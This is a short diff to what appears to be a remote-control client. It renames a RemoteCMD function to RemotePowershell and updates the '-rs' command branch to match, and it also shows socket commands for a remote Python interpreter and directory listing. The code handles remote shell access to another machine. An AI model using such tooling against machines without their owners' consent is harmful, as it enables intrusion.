@@ -132,7 +132,7 @@ def PythonInterpreter():
 
     os.remove("code.txt")
 
-def RemoteCMD():
+def RemotePowershell():
     send(b"remote-cmd")
 
     CurrentRemoteDirectory = recv(buffer).decode()
@@ -240,7 +240,7 @@ def RemoteCommands():
                 PythonInterpreter()
 
             elif (command == "-rs"):
-                RemoteCMD()
+                RemotePowershell()
 
             elif (command == "-cd"):
                 send(b"current-dir"); print(recv(buffer).decode() + "\n")
